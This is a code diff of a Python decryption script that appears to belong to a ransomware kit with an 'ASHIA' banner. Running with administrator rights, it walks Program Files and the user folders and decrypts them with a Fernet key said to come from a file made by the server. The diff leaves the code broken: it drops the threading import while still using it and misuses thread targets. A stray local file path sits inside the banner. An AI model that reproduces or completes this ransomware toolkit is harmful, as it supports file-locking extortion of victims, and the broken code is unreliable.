@@ -5,15 +5,14 @@ import os
 import ctypes
 import win32ui
 import getpass
-import threading
 
-key = 'ENTER THE KEY HERE' # the key can be found in the .txt file created by the server
+key = 'ENTER THE KEY HERE' #the key is on the .txt file create by the server
 
 banner = ''' ▄▄▄        ██████  ██░ ██  ██▓ ▄▄▄      
  ▒████▄    ▒██    ▒ ▓██░ ██▒▓██▒▒████▄    
  ▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒██▒▒██  ▀█▄  
  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ░██░░██▄▄▄▄██ 
-  ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░██░ ▓█   ▓██▒
+  ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░██░ ▓█   ▓██▒file:///C:/Users/gaston/Downloads/main.cpp
   ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒▒   ▓▒█░
    ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░  ▒   ▒▒ ░
    ░   ▒   ░  ░  ░   ░  ░░ ░ ▒ ░  ░   ▒   
@@ -29,10 +28,8 @@ banner = ''' ▄▄▄        ██████  ██░ ██  ██▓ �
 print(banner)
 print()
 
-def decrypt(path):
-	try:
-		fern = Fernet(base64.b64decode(key))
-	
+def decrypt(path, fern):
+	try:	
 		with open(path, 'rb') as f:
 			data = f.read()
 		f.close()
@@ -48,20 +45,22 @@ def decrypt(path):
 	except:
 		print('[ * ] '+path+' > already decrypted')
 
-def listfile(direction):
+def listfile(direction, fern):
 	for dossier, sous_dossiers, fichiers in os.walk(direction):
 		for fichier in fichiers:
-			decrypt(os.path.join(dossier,fichier))
+			decrypt(os.path.join(dossier,fichier), fern)
 
 if __name__ == '__main__':
 	if ctypes.windll.shell32.IsUserAnAdmin() == True:
-		thred1 = threading.Thread(target=decrypt('C:/Program Files'))
+		fern = Fernet(base64.b64decode(key))
+
+		thred1 = threading.Thread(target=listfile('C:/Program Files', fern))
 		thred1.start()
 
-		thred2 = threading.Thread(target=decrypt('C:/Users/'))
+		thred2 = threading.Thread(target=listfile('C:/Users/', fern))
 		thred2.start()
 
-		thred3 = threading.Thread(target=decrypt('C:/Users/'+getpass.getuser()))
+		thred3 = threading.Thread(target=listfile('C:/Users/'+getpass.getuser(), fern))
 		thred3.start()			
 
 		thred1.join()
@@ -69,3 +68,4 @@ if __name__ == '__main__':
 		thred3.join()
 	else:
 		win32ui.MessageBox('Please run the script with administrator permissions','Error')
+      
